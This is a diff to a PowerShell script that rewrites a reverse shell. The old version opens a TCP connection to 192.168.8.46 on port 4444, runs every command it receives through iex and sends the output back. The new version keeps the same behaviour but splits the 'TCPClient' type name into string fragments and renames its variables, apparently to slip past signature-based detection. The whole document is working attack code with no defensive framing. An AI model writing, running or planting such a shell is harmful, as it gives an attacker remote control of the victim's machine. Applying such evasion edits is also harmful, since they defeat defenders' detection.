@@ -1,18 +1,16 @@
-$ip = "192.168.8.46"
-$port = 4444
-try {
-    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-    $stream = $client.GetStream()
-    [byte[]]$bytes = 0..65535|%{0}
-    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-        $sendback = (iex $data 2>&1 | Out-String )
-        $prompt = $sendback + "PS " + (pwd).Path + "> "
-        $sendbyte = ([text.encoding]::ASCII).GetBytes($prompt)
-        $stream.Write($sendbyte, 0, $sendbyte.Length)
-        $stream.Flush()
-    }
-    $client.Close()
-} catch {
-    exit
+$a = 'Net.Sockets'
+$b = 'TCP' + 'Client'
+$c = '192.168.8.46'
+$d = 4444
+$obj = New-Object ($a + '.' + $b)($c, $d)
+$str = $obj.GetStream()
+[byte[]]$buf = 0..65535|%{0}
+while(($len = $str.Read($buf, 0, $buf.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buf, 0, $len)
+    $res = (iex $data 2>&1 | Out-String )
+    $p = $res + "PS " + (pwd).Path + "> "
+    $bytes = ([text.encoding]::ASCII).GetBytes($p)
+    $str.Write($bytes, 0, $bytes.Length)
+    $str.Flush()
 }
+$obj.Close()
